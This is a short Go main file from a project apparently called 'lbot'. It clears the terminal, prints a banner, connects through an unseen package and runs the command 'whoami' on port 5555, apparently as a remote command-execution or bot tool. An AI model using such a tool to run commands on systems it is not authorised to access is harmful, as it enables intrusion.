package main

import (
	"fmt"

	connect "lbot.init/project/cmd/connect"
	run "lbot.init/project/cmd/run"
	banner "lbot.init/project/pkg/banner"
	clear "lbot.init/project/pkg/clear"
)

func main() {
	clear.ClearTerminal()
	banner.Pbanner()
	fmt.Printf("\n[+]Running Command\n")
	excutec := "whoami"
	customPort := 5555
	connect.Connect()
	run.Run(excutec, customPort)
}
